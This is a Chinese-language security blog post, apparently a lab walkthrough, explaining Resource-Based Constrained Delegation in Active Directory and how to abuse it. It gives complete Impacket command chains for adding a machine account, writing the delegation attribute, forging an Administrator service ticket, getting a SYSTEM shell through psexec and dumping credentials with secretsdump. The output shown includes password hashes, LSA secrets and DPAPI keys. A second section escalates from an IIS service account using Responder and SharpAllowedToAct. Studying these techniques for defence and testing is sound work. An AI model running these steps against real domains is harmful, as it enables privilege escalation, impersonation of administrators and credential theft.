---
title: 基于资源的约束委派 (RBCD)攻击利用
published: 2025-03-09 16:46:27
tags: [内网安全,域渗透]
category: 安全
draft: false
---

# 基于资源的约束委派 (RBCD)攻击利用

## 前置知识

微软在`Windows Server 2012` 中新引入基于资源的约束性委派（Resource Based Constrained Delegation, RBCD），`RBCD`不需要通过具备`SeEnableDelegationPrivilege`权限的域管理员进行修改，而是将

**设置属性的权限给了服务资源本身** https://www.cnblogs.com/seizer/p/18003119

例如从 Service A 到 Service B 的委派

**传统的约束委派**是正向的, 需要以域管的权限将 Service A 的 `msDS-AllowedToDelegateTo` 属性指定为 Service B

而**基于资源的约束委派**则是反向的, 无需域管权限, 只需要在 Service B 上将 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性指定为 Service A, 即可完成委派的配置

https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html （应有尽有,这里理解委派知识以及攻击手法）

## 攻击核心条件

配置 RBCD 的关键在于 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性, 通常以下用户能够修改此属性

- 将主机加入域的用户 (机器账户中会有一个 msDS-CreatorSID 属性, 使用非域管账户加入域时才会显示)
- Account Operators (能修改任意域内非域控机器的委派属性)
- NT AUTHORITY\SELF (该主机的机器账户)

**约束委派与基于资源的约束委派的区别：**

传统的约束委派 S4U2Self 返回的票据一定是可转发的（`Forwardable`标记），如果不可转发那么S4U2Proxy（S4U2Proxy 需要将票据传递给下游服务）将失败；

但是基于资源的约束委派不同，就算S4U2Self返回的票据不可转发（可不可以转发由`TrustedToAuthenticationForDelegation`决定），S4U2Proxy 也是可以成功，并且S4U2Proxy 返回的票据总是可转发。

基于资源的约束委派是`Windows Server 2012` 和更高版本引入的功能

**创建机器用户：**

默认域控的`ms-DS-MachineAccountQuota`属性设置允许所有域用户（可以是域内的用户账户、服务账户、机器账户）向一个域添加10个计算机帐户。而服务账户出网时使用的时本机的机器账户。

## 常规利用

https://exp10it.io/2023/08/resource-based-constrained-delegation-attack-summary 

一般的情况是我们拿到一个域内的普通用户, 并且发现某台机器是通过该用户加入域的, 那么就可以通过 RBCD 在该机器上实现本地提权

查询域内机器的 CreatorSID 属性，使用 AdFind 查询

```jsx
AdFind.exe -b "DC=sunset,DC=com" -f "objectClass=computer" cn ms-DS-CreatorSID
```

![image.png](image%2056.png)

查询确定`S-1-5-21-3610652312-2325709601-788499419-1112` 这个用户

```jsx
AdFind.exe -b "DC=sunset,DC=com" -f "(&(objectsid=S-1-5-21-3610652312-2325709601-788499419-1112))" objectclass cn dn
```

![image.png](image%2057.png)

是叫`test`的用户？耶？不就是我吗？

![image.png](image%2058.png)

那么就可以知道该计算机是通过 test 账户加入域的，那么 test 就拥有权限修改他的`msDS-AllowedToActOnBehalfOfOtherIdentity` 属性

通过 test 账户在域内添加一个机器账户

```jsx
⚡ root@kali  ~/Desktop/Tools/pywerview/output  addcomputer.py sunset.com/test:Aa118811 -computer-name TEST\$ -computer-pass 123456 -dc-host DC.sunset.com -dc-ip 192.168.111.167
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account TEST$ with password 123456.
```

然后配置 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性

将 `TEST$` 计算机账户添加到 `server01$` 计算机账户的 **msDS-AllowedToActOnBehalfOfOtherIdentity** 属性中

`TEST$` 计算机账户就可以通过 Kerberos 认证，以其他用户的身份代表他们访问 `server01$`，实现委派访问

```jsx
⚡ root@kali  ~/Desktop/Tools/pywerview/output  rbcd.py sunset.com/test:Aa118811 -dc-ip 192.168.111.167 -action write -delegate-to server01\$ -delegate-from TEST\$ 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] TEST$ can now impersonate users on server01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     TEST$        (S-1-5-21-3610652312-2325709601-788499419-1114)
```

查看委派是否成功

```jsx
⚡ root@kali  ~/Desktop/Tools/pywerview/output  findDelegation.py sunset.com/test:Aa118811 -dc-ip 192.168.111.167 -target-domain sunset.com 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

AccountName  AccountType  DelegationType              DelegationRightsTo  SPN Exists 
-----------  -----------  --------------------------  ------------------  ----------
TEST$        Computer     Resource-Based Constrained  SERVER01$           No      
```

最后利用 S4U 协议伪造 Administrator 用户申请 ST

```jsx
⚡ root@kali  ~/Desktop/Tools/pywerview/output  getST.py -dc-ip 192.168.111.167 -spn cifs/server01.sunset.com -impersonate Administrator sunset.com/test\$:123456
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_server01.sunset.com@SUNSET.COM.ccache
```

导入票据

```jsx
 ⚡ root@kali  ~/Desktop/Tools/pywerview/output  export KRB5CCNAME=Administrator@cifs_server01.sunset.com@SUNSET.COM.ccache                                                                                                       
```

`psexec`连接主机，指定使用票据

```jsx
 ⚡ root@kali  ~/Desktop/Tools/pywerview/output  psexec.py -no-pass -k server01.sunset.com -dc-ip 192.168.111.167                                                                                                                 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Requesting shares on server01.sunset.com.....                                                                 
[*] Found writable share ADMIN$                                                                                                                                                                                                     
[*] Uploading file MmuygSws.exe                          
[*] Opening SVCManager on server01.sunset.com.....                                                                
[*] Creating service tRjX on server01.sunset.com.....                                                             
[*] Starting service tRjX.....                                                                                                                                                                                                      
[!] Press help for extra shell commands                                                                           
[-] Decoding error detected, consider running chcp.com at the target,                                             
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings                                                                                                                                                
and then execute smbexec.py again with -codec and the corresponding codec                                         
Microsoft Windows [�汾 6.1.7601]                                                                                  
                                                         
[-] Decoding error detected, consider running chcp.com at the target,                                             
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings                                                                                                                                                
and then execute smbexec.py again with -codec and the corresponding codec                                         
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����                                                             
                                                                                                                  
                                                         
C:\Windows\system32> whoami
nt authority\system                                          
```

DCSync

```jsx
⚡ root@kali  ~/Desktop/Tools/pywerview/output  secretsdump.py -k -no-pass server01.sunset.com -dc-ip 192.168.111.167        
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xe38420c0ae384190c7869bd3a72c8750
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f98564f9c7fab916678466075899f6e1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
SUNSET.COM/test:$DCC2$10240#test#3cecc3d61e12d28d2398cde8631251c0: (2025-02-23 08:48:08)
SUNSET.COM/Administrator:$DCC2$10240#Administrator#e0f7d91244ea00c524d6981b2e118de8: (2025-02-23 08:44:01)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
SUNSET\SERVER01$:plain_password_hex:6000620061005b00350054005f006d005e003d00510064006700720079002c007a007a00420068003b00790030004a007000770047006b0023004400570021003b006c003d006b0059003b005c0022006c003d003f005300430061002e00290076006f00350047002d0077005a00420055002f005d0030002e004600630039004c0026003e0061006c00300058004e002d00250032002c002c005d003a0054003f007100400041007300750079005300660030006f003e00460038003e00620046006f0073006f003d004d00670062006f003b00500054005e002f005f0051002b003b0022003b005b00230041004c00
SUNSET\SERVER01$:aad3b435b51404eeaad3b435b51404ee:9d925982a1feff69ff7708d1aa7e95fd:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0a502629e4f5d71335be8df4fa89995c7fe827bd
dpapi_userkey:0x53551029fe705233ace52f72b86760181b0bcb81
[*] NL$KM 
 0000   6D 1C C4 32 85 88 55 96  21 61 C1 B9 A8 AE FA 15   m..2..U.!a......
 0010   41 71 8C D4 31 CB F5 74  3F 75 67 13 39 5B E0 CD   Aq..1..t?ug.9[..
 0020   1C EF 25 18 87 E9 49 F0  5B 9B F2 C1 97 83 CE 5F   ..%...I.[......_
 0030   44 58 B3 E8 0D 4D 37 77  ED B1 BC 6F 57 7E 79 75   DX...M7w...oW~yu
NL$KM:6d1cc432858855962161c1b9a8aefa1541718cd431cbf5743f756713395be0cd1cef251887e949f05b9bf2c19783ce5f4458b3e80d4d3777edb1bc6f577e7975
[*] Cleaning up... 
```

## 原理

1. test 执行 `S4U2Self`，请求一个 `TGS` 票据，对外宣称 administrator 在访问自己
    
    （test 是机器用户，所以可以请求`S4U2Self`）
    
2. test 使用 S4U2Self 获得的 administrator 的 `TGS` 票据，代表server01执行 `S4U2Proxy`，生成一个服务票据，表示 administrator 在访问 SERVER01 的 CIFS 服务
    
    （SERVER01 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性必须包含 test 的 SID，表明 SERVER01 信任 test 执行委派）
    
3. 使用 `S4U2Proxy` 生成的服务票据，攻击者以 administrator 的身份访问 SERVER01 的 CIFS 服务

## 服务账户提权

原理：在 **域环境** 下，IIS、MSSQL、Network Service 这些 **低权限的服务账户** 在访问网络资源（如共享文件、LDAP、SQL Server）时，默认会使用 **本机的计算机账户（Machine Account）**，而不是它们自己的本地权限

![image.png](image%2059.png)

查询域内机器的 CreatorSID 属性，使用 AdFind 查询（这里的主机时`web-server`）

![image.png](image%2060.png)

这里以 `WEB-SERVER`的`IIS`为例子，现在服务器上制作一个代码执行的页面，以便`Responder`捕捉触网身份的`NET-NTLM-HASH` 

执行`whoami` ，当前身份是`iis apppool\defaultapppool` 本地权限非常低

![image.png](image%2061.png)

开启`Responder`准备捕捉`NET-NTLM-HASH` ，通过`dir`（别的也行）访问开启`Responder`的机器

捕捉到后，可以看到`IIS`出网时`SUNSET\WEB-SERVER$` 是机器用户，而不是本地用户

![image.png](image%2062.png)

利用 https://github.com/pkb1s/SharpAllowedToAct 创建用户

思路和常规利用的思路差不多，都是用当前用户身份创建机器用户并配置委派属性

(这里不知道哪里出了问题，会提示`[!] Cannot enumerate domain` 扒了下程序的源码说是找不到域控)

```jsx
C:\inetpub\wwwroot\user\SharpAllowedToAct.exe -m hacker -p 123456 -t WEB-SERVER -d sunset.com
```

成功添加主机后，剩下的操作和上面的操作一样

```jsx
getST.py -dc-ip 192.168.111.167 -spn cifs/WEB-SERVER.sunset.com -impersonate Administrator sunset.com/test\$:123456
```

```jsx
export KRB5CCNAME=Administrator@cifs_WEB-SERVER.sunset.com@SUNSET.COM.ccache 
```

```jsx
psexec.py -no-pass -k WEB-SERVER.sunset.com -dc-ip 192.168.111.167

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on WEB-SERVER.sunset.com.....
[*] Found writable share ADMIN$
[*] Uploading file zsYktUZW.exe
[*] Opening SVCManager on WEB-SERVER.sunset.com.....
[*] Creating service wcbl on WEB-SERVER.sunset.com.....
[*] Starting service wcbl.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [�汾 6.1.7601]

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32> whoami
nt authority\system
```